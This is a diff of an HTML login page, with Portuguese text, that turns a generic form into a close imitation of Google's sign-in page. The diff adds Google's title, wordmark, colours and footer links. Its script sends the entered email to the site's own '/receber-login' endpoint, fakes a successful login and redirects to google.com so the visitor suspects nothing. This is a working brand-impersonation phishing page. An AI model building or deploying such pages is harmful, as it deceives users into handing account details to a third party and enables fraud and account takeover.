@@ -3,104 +3,325 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema de Login Online</title>
+    <title>Fazer login nas Contas do Google</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
         }
+        
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #fff;
+            color: #202124;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            flex-direction: column;
         }
-        .container {
-            background: white;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            max-width: 400px;
-            width: 100%;
-        }
-        h1 {
+        
+        /* Header */
+        .header {
+            padding: 20px 0;
             text-align: center;
-            margin-bottom: 20px;
-            color: #333;
+            border-bottom: 1px solid #dadce0;
         }
-        .form-group {
-            margin-bottom: 20px;
+        
+        .google-logo {
+            font-size: 22px;
+            font-weight: 400;
+            color: #5f6368;
         }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+        
+        /* Main Container */
+        .container {
+            max-width: 448px;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .login-box {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        
+        /* Title */
+        .title {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .title h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .title p {
             font-size: 16px;
+            color: #202124;
+            font-weight: 400;
         }
-        button {
+        
+        /* Form */
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-field {
             width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        
+        .input-field.error {
+            border-color: #d93025;
+        }
+        
+        /* Links */
+        .forgot-email {
+            display: block;
+            text-align: left;
+            margin-bottom: 26px;
+        }
+        
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-email a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Info Text */
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 32px 0 26px;
+            line-height: 1.4286;
+        }
+        
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Buttons */
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
+            transition: background 0.2s;
         }
+        
+        .next-button:hover {
+            background: #1669d6;
+        }
+        
+        .next-button:disabled {
+            background: #1a73e8;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        /* Footer */
+        .footer {
+            padding: 24px 0;
+            border-top: 1px solid #dadce0;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 448px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .language-select {
+            border: none;
+            background: none;
+            color: #1a73e8;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 8px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: #757575;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Result Message */
         .result {
             margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
+            padding: 16px;
+            border-radius: 4px;
+            font-size: 14px;
             display: none;
         }
-        .success {
-            background: #d4edda;
-            color: #155724;
+        
+        .result.success {
+            background: #e6f4ea;
+            border: 1px solid #34a853;
+            color: #137333;
         }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
+        
+        .result.error {
+            background: #fce8e6;
+            border: 1px solid #f28b82;
+            color: #c5221f;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+            }
+            
+            .login-box {
+                border: none;
+                padding: 24px 0;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                gap: 16px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Header -->
+    <div class="header">
+        <div class="google-logo">Google</div>
+    </div>
+
+    <!-- Main Content -->
     <div class="container">
-        <h1>🚀 Sistema de Login</h1>
-        <p style="text-align: center; color: #666; margin-bottom: 20px;">
-            Agora funcionando online!
-        </p>
-        
-        <form id="loginForm">
-            <div class="form-group">
-                <input type="email" id="email" placeholder="Seu e-mail" required>
+        <div class="login-box">
+            <div class="title">
+                <h1>Fazer login</h1>
+                <p>Use sua Conta do Google</p>
             </div>
-            <div class="form-group">
-                <input type="password" id="senha" placeholder="Sua senha" required>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
+                </div>
+
+                <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
+
+                <div class="info-text">
+                    Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
+                </div>
+
+                <div class="buttons">
+                    <a href="#" class="create-account">Criar conta</a>
+                    <button type="submit" class="next-button" id="submitBtn">Próxima</button>
+                </div>
+            </form>
+
+            <div class="result" id="result"></div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-content">
+            <select class="language-select">
+                <option>Português (Brasil)</option>
+                <option>English (United States)</option>
+                <option>Español (España)</option>
+            </select>
+            
+            <div class="footer-links">
+                <a href="#">Ajuda</a>
+                <a href="#">Privacidade</a>
+                <a href="#">Termos</a>
             </div>
-            <button type="submit">Enviar para o Servidor</button>
-        </form>
-        
-        <div class="result" id="result"></div>
-        
-        <div style="margin-top: 20px; text-align: center;">
-            <a href="/health" style="color: #667eea;">Testar Servidor</a>
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
             
             const email = document.getElementById('email').value;
-            const senha = document.getElementById('senha').value;
+            const submitBtn = document.getElementById('submitBtn');
             const result = document.getElementById('result');
             
+            // Validar email
+            if (!email.includes('@')) {
+                document.getElementById('email').classList.add('error');
+                return;
+            }
+            
+            // Mostrar carregamento
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Enviando...';
+            result.style.display = 'none';
+            
             try {
+                // Enviar para o backend
                 const response = await fetch('/receber-login', {
                     method: 'POST',
                     headers: {
@@ -108,31 +329,47 @@
                     },
                     body: JSON.stringify({
                         email: email,
-                        senha: senha
+                        senha: 'google_login' // Simulando senha padrão
                     })
                 });
                 
                 const data = await response.json();
                 
-                result.className = 'result success';
-                result.innerHTML = `
-                    <strong>✅ ${data.message}</strong><br>
-                    <small>Email: ${email}</small><br>
-                    <small>Data: ${data.data}</small>
-                `;
-                result.style.display = 'block';
-                
-                // Limpar formulário
-                document.getElementById('loginForm').reset();
+                if (response.ok) {
+                    result.className = 'result success';
+                    result.innerHTML = `
+                        <strong>✅ Login realizado com sucesso!</strong><br>
+                        <small>E-mail: ${email}</small><br>
+                        <small>Redirecionando...</small>
+                    `;
+                    result.style.display = 'block';
+                    
+                    // Simular redirecionamento do Google
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 2000);
+                    
+                } else {
+                    throw new Error(data.message || 'Erro no servidor');
+                }
                 
             } catch (error) {
                 result.className = 'result error';
                 result.innerHTML = `
-                    <strong>❌ Erro ao enviar</strong><br>
+                    <strong>❌ Erro ao fazer login</strong><br>
                     <small>${error.message}</small>
                 `;
                 result.style.display = 'block';
+            } finally {
+                // Restaurar botão
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Próxima';
             }
+        });
+
+        // Remover erro quando usuário digitar
+        document.getElementById('email').addEventListener('input', function() {
+            this.classList.remove('error');
         });
     </script>
 </body>
